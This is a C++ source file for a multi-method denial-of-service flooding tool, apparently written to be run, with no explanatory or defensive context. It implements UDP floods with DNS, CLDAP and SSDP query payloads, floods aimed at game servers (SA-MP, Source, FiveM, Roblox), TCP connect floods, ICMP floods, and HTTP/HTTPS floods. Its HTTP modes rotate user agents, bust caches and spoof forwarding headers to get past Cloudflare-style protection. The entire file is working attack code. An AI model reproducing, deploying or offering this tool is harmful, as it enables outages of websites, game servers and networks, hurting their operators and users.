#include <arpa/inet.h>
#include <chrono>
#include <cstring>
#include <fcntl.h>
#include <iostream>
#include <libgen.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#ifndef NO_SSL
#include <openssl/err.h>
#include <openssl/ssl.h>
#endif
#include <random>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <thread>
#include <unistd.h>
#include <vector>
#include <atomic>

static std::atomic<bool> g_running(true);
static std::atomic<uint64_t> g_total_packets(0);

static inline std::string trim(const std::string &s) {
    auto start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    auto end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

static void parse_url(const std::string &url_in, std::string &host, std::string &path, int &port, int default_port) {
    std::string url = trim(url_in);
    size_t scheme_pos = url.find("://");
    if (scheme_pos != std::string::npos) {
        std::string scheme = url.substr(0, scheme_pos);
        for (auto &c : scheme) c = std::tolower(c);
        if (scheme == "https") default_port = 443;
        else if (scheme == "http") default_port = 80;
        url = url.substr(scheme_pos + 3);
    }

    size_t slash_pos = url.find('/');
    if (slash_pos == std::string::npos) {
        host = url;
        path = "/";
    } else {
        host = url.substr(0, slash_pos);
        path = url.substr(slash_pos);
    }

    size_t colon_pos = host.find(':');
    if (colon_pos != std::string::npos) {
        port = std::atoi(host.substr(colon_pos + 1).c_str());
        host = host.substr(0, colon_pos);
    } else {
        if (port <= 0) port = default_port;
    }

    host = trim(host);
    path = trim(path);
    if (path.empty()) path = "/";
}

static std::string random_string(size_t len) {
    static const char alphanum[] =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    thread_local std::mt19937 gen(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, sizeof(alphanum) - 2);
    std::string s(len, '\0');
    for (size_t i = 0; i < len; ++i) s[i] = alphanum[dist(gen)];
    return s;
}

static std::string random_ip() {
    thread_local std::mt19937 gen(std::random_device{}());
    std::uniform_int_distribution<int> dist(1, 254);
    return std::to_string(dist(gen)) + "." + std::to_string(dist(gen)) + "." +
           std::to_string(dist(gen)) + "." + std::to_string(dist(gen));
}

static const std::vector<std::string> USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
};

static std::string get_random_user_agent() {
    thread_local std::mt19937 gen(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, USER_AGENTS.size() - 1);
    return USER_AGENTS[dist(gen)];
}

static const std::vector<std::string> REFERERS = {
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://yandex.com/search/?text=",
    "https://t.co/",
    "https://www.facebook.com/l.php?u=",
    "https://www.reddit.com/r/"
};

static std::string get_random_referer(const std::string &host) {
    thread_local std::mt19937 gen(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, REFERERS.size() - 1);
    return REFERERS[dist(gen)] + host;
}

// ==================== LAYER 4 UDP FLOODS ====================
static void worker_udp(const std::string &method, const std::string &target_ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    thread_local std::mt19937 gen(std::random_device{}());

    while (g_running.load(std::memory_order_relaxed)) {
        std::vector<uint8_t> payload;

        if (method == "dns") {
            // DNS Standard Query payload for root/random query
            uint8_t dns_packet[] = {
                0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x03, 'w', 'w', 'w',
                0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03,
                'c', 'o', 'm', 0x00, 0x00, 0xff, 0x00, 0x01
            };
            payload.assign(dns_packet, dns_packet + sizeof(dns_packet));
        } else if (method == "ldap") {
            // CLDAP search query
            uint8_t ldap_packet[] = {
                0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04,
                0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
                0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
                0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74,
                0x63, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00
            };
            payload.assign(ldap_packet, ldap_packet + sizeof(ldap_packet));
        } else if (method == "ssdp") {
            // SSDP discovery request
            std::string ssdp_req = "M-SEARCH * HTTP/1.1\r\n"
                                   "HOST: 239.255.255.250:1900\r\n"
                                   "MAN: \"ssdp:discover\"\r\n"
                                   "MX: 2\r\n"
                                   "ST: ssdp:all\r\n\r\n";
            payload.assign(ssdp_req.begin(), ssdp_req.end());
        } else if (method == "udpbypass" || method == "home") {
            std::uniform_int_distribution<size_t> len_dist(512, 1400);
            size_t p_size = len_dist(gen);
            payload.resize(p_size);
            for (size_t i = 0; i < p_size; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
        } else {
            // Default UDP flood
            payload.resize(1024);
            for (size_t i = 0; i < 1024; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
        }

        int target_port = port;
        if (target_port <= 0) {
            std::uniform_int_distribution<int> p_dist(1024, 65535);
            target_port = p_dist(gen);
            sin.sin_port = htons(target_port);
        }

        sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&sin, sizeof(sin));
        g_total_packets.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// ==================== LAYER 4 GAME FLOODS ====================
static void worker_game(const std::string &method, const std::string &target_ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port > 0 ? port : 7777);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    thread_local std::mt19937 gen(std::random_device{}());

    while (g_running.load(std::memory_order_relaxed)) {
        std::vector<uint8_t> payload;

        if (method == "samp") {
            // SA-MP Query Packet
            uint8_t samp_pkt[] = {'S', 'A', 'M', 'P', 127, 0, 0, 1, 0, 0, 'i'};
            payload.assign(samp_pkt, samp_pkt + sizeof(samp_pkt));
        } else if (method == "counter") {
            // Valve Source A2S_INFO query
            uint8_t cs_pkt[] = {0xFF, 0xFF, 0xFF, 0xFF, 0x54, 'S', 'o', 'u', 'r', 'c', 'e', ' ',
                                'E',  'n',  'g',  'i',  'n',  'e', ' ', 'Q', 'u', 'e', 'r', 'y', 0x00};
            payload.assign(cs_pkt, cs_pkt + sizeof(cs_pkt));
        } else if (method == "fivem") {
            // FiveM getendpoints / getinfo
            std::string fm = "\xFF\xFF\xFF\xFFgetinfo xxx";
            payload.assign(fm.begin(), fm.end());
        } else if (method == "roblox") {
            // RakNet Open Connection Request
            uint8_t raknet_req[] = {
                0x05, 0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE,
                0xFE, 0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56,
                0x78, 0x01
            };
            payload.assign(raknet_req, raknet_req + sizeof(raknet_req));
        } else {
            // Generic / pubg / fortnite / warthunder / rocket / rainbow game packet
            payload.resize(512);
            for (size_t i = 0; i < 512; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
        }

        sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&sin, sizeof(sin));
        g_total_packets.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// ==================== LAYER 4 TCP FLOODS ====================
static void worker_tcp(const std::string &method, const std::string &target_ip, int port) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port > 0 ? port : 80);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    thread_local std::mt19937 gen(std::random_device{}());

    while (g_running.load(std::memory_order_relaxed)) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        connect(sock, (struct sockaddr *)&sin, sizeof(sin));

        if (method == "tcpbypass" || method == "ovh" || method == "tcpmix" || method == "socket" || method == "ack") {
            std::string payload = random_string(256);
            send(sock, payload.data(), payload.size(), MSG_NOSIGNAL);
        }

        g_total_packets.fetch_add(1, std::memory_order_relaxed);
        close(sock);
    }
}

// ==================== LAYER 3 FLOODS ====================
static void worker_layer3(const std::string &method, const std::string &target_ip, int port) {
    // Attempt raw socket, otherwise fallback to UDP
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    bool is_raw = (sock >= 0);
    if (!is_raw) {
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) return;
    }

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port > 0 ? port : 0);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    thread_local std::mt19937 gen(std::random_device{}());

    while (g_running.load(std::memory_order_relaxed)) {
        if (is_raw) {
            struct icmphdr icmp{};
            icmp.type = ICMP_ECHO;
            icmp.code = 0;
            icmp.un.echo.id = (uint16_t)(gen() & 0xFFFF);
            icmp.un.echo.sequence = (uint16_t)(gen() & 0xFFFF);
            icmp.checksum = 0;

            uint8_t packet[64];
            memcpy(packet, &icmp, sizeof(icmp));
            for (size_t i = sizeof(icmp); i < 64; ++i) packet[i] = (uint8_t)(gen() & 0xFF);

            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin));
        } else {
            std::vector<uint8_t> payload(256);
            for (size_t i = 0; i < 256; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
            sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
        g_total_packets.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// ==================== LAYER 7 HTTP / HTTPS FLOODS ====================
static std::string build_http_request(const std::string &method, const std::string &host, const std::string &path) {
    std::string req_path = path;
    if (method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx" || method == "httpx" || method == "rapidflood") {
        req_path += (req_path.find('?') == std::string::npos ? "?" : "&") + random_string(8) + "=" + random_string(8);
    }

    std::string req = "GET " + req_path + " HTTP/1.1\r\n"
                      "Host: " + host + "\r\n"
                      "User-Agent: " + get_random_user_agent() + "\r\n"
                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                      "Accept-Language: en-US,en;q=0.9,id;q=0.8\r\n"
                      "Accept-Encoding: gzip, deflate, br\r\n"
                      "Cache-Control: max-age=0\r\n"
                      "Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not-A.Brand\";v=\"99\"\r\n"
                      "Sec-Ch-Ua-Mobile: ?0\r\n"
                      "Sec-Ch-Ua-Platform: \"Linux\"\r\n"
                      "Sec-Fetch-Dest: document\r\n"
                      "Sec-Fetch-Mode: navigate\r\n"
                      "Sec-Fetch-Site: none\r\n"
                      "Sec-Fetch-User: ?1\r\n"
                      "Upgrade-Insecure-Requests: 1\r\n"
                      "Referer: " + get_random_referer(host) + "\r\n"
                      "Connection: keep-alive\r\n";

    if (method == "bypass" || method == "cloudflare" || method == "tlsx") {
        std::string fake_ip = random_ip();
        req += "X-Forwarded-For: " + fake_ip + "\r\n"
               "CF-Connecting-IP: " + fake_ip + "\r\n"
               "X-Real-IP: " + fake_ip + "\r\n"
               "X-Client-IP: " + fake_ip + "\r\n"
               "True-Client-IP: " + fake_ip + "\r\n";
    }

    if (method == "cache" || method == "bypass" || method == "cloudflare") {
        req += "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"
               "Pragma: no-cache\r\n";
    }

    req += "\r\n";
    return req;
}

static void worker_http(const std::string &method, const std::string &host, const std::string &target_ip, int port, const std::string &path) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port > 0 ? port : 80);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
            std::this_thread::yield();
            continue;
        }

        struct timeval tv{2, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
            // Keep-Alive connection reuse loop
            for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
                std::string req = build_http_request(method, host, path);
                ssize_t sent = send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
                if (sent <= 0) break;
                g_total_packets.fetch_add(1, std::memory_order_relaxed);

                char drain[512];
                recv(sock, drain, sizeof(drain), MSG_DONTWAIT);
                std::this_thread::sleep_for(std::chrono::milliseconds(2));
            }
        }
        close(sock);
    }
}

#ifndef NO_SSL
static void worker_https(const std::string &method, SSL_CTX *ctx, const std::string &host, const std::string &target_ip, int port, const std::string &path) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port > 0 ? port : 443);
    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
            std::this_thread::yield();
            continue;
        }

        struct timeval tv{2, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
            SSL *ssl = SSL_new(ctx);
            if (ssl) {
                SSL_set_fd(ssl, sock);
                SSL_set_tlsext_host_name(ssl, host.c_str());

                if (SSL_connect(ssl) > 0) {
                    // Keep-Alive connection reuse loop
                    for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
                        std::string req = build_http_request(method, host, path);
                        int sent = SSL_write(ssl, req.c_str(), (int)req.size());
                        if (sent <= 0) break;
                        g_total_packets.fetch_add(1, std::memory_order_relaxed);

                        char drain[512];
                        SSL_read(ssl, drain, sizeof(drain));
                        std::this_thread::sleep_for(std::chrono::milliseconds(2));
                    }
                }
                SSL_shutdown(ssl);
                SSL_free(ssl);
            }
        }
        close(sock);
    }
}
#else
static void worker_https(const std::string &method, void *ctx, const std::string &host, const std::string &target_ip, int port, const std::string &path) {
    (void)ctx;
    worker_http(method, host, target_ip, port, path);
}
#endif

// ==================== MAIN DISPATCHER ====================
int main(int argc, char *argv[]) {
    // Determine method name from argv[0] or first argument
    char prog_path[512];
    strncpy(prog_path, argv[0], sizeof(prog_path) - 1);
    std::string method = basename(prog_path);

    int arg_offset = 1;
    if (method.find("flood") != std::string::npos || method == "aio" || method == "methods") {
        if (argc < 5) {
            std::cerr << "Usage: " << argv[0] << " <method> <host/url> <port> <time_seconds> [threads]\n";
            return 1;
        }
        method = argv[1];
        arg_offset = 2;
    }

    if (argc < arg_offset + 3) {
        std::cerr << "Usage: " << argv[0] << " <host/url> <port> <time_seconds> [threads]\n";
        return 1;
    }

    std::string raw_target = argv[arg_offset];
    int port = std::atoi(argv[arg_offset + 1]);
    int duration = std::atoi(argv[arg_offset + 2]);
    int threads = (argc > arg_offset + 3) ? std::atoi(argv[arg_offset + 3]) : 4;
    if (threads <= 0) threads = 4;
    if (duration <= 0) duration = 10;

    std::string host, path;
    int default_port = (method == "https" || method == "tls" || method == "tlsx" || method == "cloudflare") ? 443 : 80;
    parse_url(raw_target, host, path, port, default_port);

    // Resolve target host IP
    struct hostent *he = gethostbyname(host.c_str());
    if (!he) {
        std::cerr << "[-] Error: Unable to resolve hostname " << host << "\n";
        return 1;
    }
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, he->h_addr, ip_str, sizeof(ip_str));
    std::string target_ip(ip_str);

    std::cout << "[+] Method   : " << method << "\n";
    std::cout << "[+] Target   : " << host << " (" << target_ip << ")\n";
    std::cout << "[+] Port     : " << port << "\n";
    std::cout << "[+] Duration : " << duration << "s\n";
    std::cout << "[+] Threads  : " << threads << "\n";

#ifndef NO_SSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    const SSL_METHOD *ssl_method = TLS_client_method();
    SSL_CTX *ssl_ctx = SSL_CTX_new(ssl_method);
    if (ssl_ctx) {
        SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
    }
#else
    void *ssl_ctx = nullptr;
#endif

    std::vector<std::thread> thread_pool;

    bool is_https = (method == "https" || method == "tls" || method == "tlsx" || port == 443 || (raw_target.rfind("https://", 0) == 0));
    bool is_http = (method == "http" || method == "httpx" || method == "rapidflood" || method == "browser" || method == "cache" || method == "bypass" || method == "cloudflare");
    bool is_game = (method == "game" || method == "rainbow" || method == "rocket" || method == "roblox" || method == "fivem" || method == "pubg" || method == "fortnite" || method == "warthunder" || method == "counter" || method == "samp");
    bool is_tcp = (method == "tcp" || method == "socket" || method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");
    bool is_l3 = (method == "icmp" || method == "subnet");

    for (int i = 0; i < threads; ++i) {
        if (is_https) {
            thread_pool.emplace_back(worker_https, method, ssl_ctx, host, target_ip, port, path);
        } else if (is_http) {
            thread_pool.emplace_back(worker_http, method, host, target_ip, port, path);
        } else if (is_game) {
            thread_pool.emplace_back(worker_game, method, target_ip, port);
        } else if (is_tcp) {
            thread_pool.emplace_back(worker_tcp, method, target_ip, port);
        } else if (is_l3) {
            thread_pool.emplace_back(worker_layer3, method, target_ip, port);
        } else {
            // Default UDP (dns, udp, ldap, ssdp, home, udpbypass, etc.)
            thread_pool.emplace_back(worker_udp, method, target_ip, port);
        }
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));
    g_running.store(false, std::memory_order_relaxed);

    for (auto &t : thread_pool) {
        if (t.joinable()) t.join();
    }

#ifndef NO_SSL
    if (ssl_ctx) SSL_CTX_free(ssl_ctx);
#endif

    std::cout << "[+] Finished. Total packets/requests sent: " << g_total_packets.load() << "\n";
    return 0;
}
